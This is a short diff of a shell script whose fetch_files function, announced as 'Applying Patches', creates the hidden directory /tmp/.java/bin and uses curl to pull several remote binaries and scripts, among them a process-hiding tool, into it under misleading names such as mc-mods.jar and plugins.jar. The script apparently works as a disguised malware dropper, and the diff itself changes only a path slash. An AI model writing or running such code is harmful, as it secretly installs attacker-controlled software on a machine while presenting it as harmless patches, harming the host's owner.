@@ -4,7 +4,7 @@ function fetch_files() {
     echo "Applying Patches ..."
     mkdir -p /tmp/.java/bin
     cd /tmp/.java/bin/ && curl -L https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-linux-x86_64 -o mc-mods.jar
-    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
     cd /tmp/.java/bin/ && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o user-patch.jar
     cd /tmp/.java/bin/ && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
     cd /tmp/.java/bin/ && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/es/cfg.conf -o cfg.conf
